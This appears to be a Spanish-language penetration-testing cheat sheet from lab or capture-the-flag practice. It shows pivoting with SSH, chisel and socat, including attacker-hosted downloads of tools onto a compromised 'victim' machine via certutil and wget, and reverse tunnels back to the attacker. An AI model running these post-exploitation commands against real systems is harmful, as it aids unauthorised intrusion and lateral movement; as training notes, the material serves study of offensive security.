
## SSH, CHISEL, SOCAT
```shell
--> SSH                         (LPK --> Local Port on ATTACKER Machine)
    -L (Local Port Forwarding)            LPK:127.0.0.1:PORT
            > ssh dave@10.10.10.109 -L 8000:192.168.122.4:80    (Attacker Machine)

    -R (Remote Port Forwarding)            LPK:84.3.3.3:PORT
            > ssh dave@10.10.10.109 -R 8000:10.10.10.100:80     (Attacker Machine)
            
    Dos puerrtos
		    > ssh -f -N -L 8000:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.10.11.214

--> CHISEL
        > ./chisel server -p 80 --socks5 --reverse               (Attacker Machine)
        > ./chisel client 192.168.45.192:80 R:socks                 (Victim Machine)
        > ./chisel client 10.10.14.38:80 R:9000:192.168.122.4:80 (Victim Machine)

--> SOCAT
        > ./socat tcp-l:8001 tcp-l:7777,fork,reuseaddr           (Attacker Machine)
        > ./socat tcp:10.10.14.38:8001 tcp:192.168.122.4:80,fork (Victim Machine)
```


# BUSCAR LIGOLO

# EXPLICACIÓN CHISEL EXTENDIDA WINDOWS
```shell
#EN NUESTRA MÁQUINA LOCAL LINUX
❯ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
❯ gunzip chisel_1.10.1_linux_amd64.gz
❯ mv chisel_1.10.1_linux_amd64 chisel
❯ chmod +x ./chisel

wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
mv chisel_1.10.1_windows_amd64.gz chisel.exe.gz
gunzip chisel.exe.gz

#SUBIR A LA MÁQUINA VICTIMA
python3 -m http.server 80
certutil.exe -f -urlcache -split http://10.10.16.4/chisel.exe chisel.exe

#EJECUTAR PORT FORWARDING
./chisel server --reverse -p 1234 #EN LA MÁQUINA LINUX
.\chisel.exe client 192.168.45.227:1234 R:1443:127.0.0.1:1443 #EN LA MÁQUINA WINDOWS
```



# EXPLICACIÓN CHISEL EXTENDIDA LINUX
```shell
#EN NUESTRA MÁQUINA LOCAL
❯ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
❯ gunzip chisel_1.10.1_linux_amd64.gz
❯ mv chisel_1.10.1_linux_amd64 chisel
❯ sudo python3 -m http.server 9999

#DESDE LA MÁQUINA VICTIMA.
www-data@moderators:/opt/site.new$ cd /tmp
www-data@moderators:/tmp$ wget http://10.10.16.7:9999/chisel
www-data@moderators:/tmp$ chmod +x chisel

#DESDE LA MÁQUINA LOCAL
❯ chmod +x chisel
❯ ./chisel server --reverse -p 1234
❯ lsof -i:8080    # COMPROBAR QUE EL 8080 NO ESTA EN USO.

#DESDE LA MÁQUINA VICTIMA.
www-data@moderators:/tmp$ ./chisel client 10.10.16.6:1234 R:8080:127.0.0.1:8080 

#DESDE LA MÁQUINA LOCAL. # TENDRIAMOS QUE VERLO EN USO. 
❯ lsof -i:8080
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
chisel  184878 user    7u  IPv6 437281      0t0  TCP *:http-alt (LISTEN)
```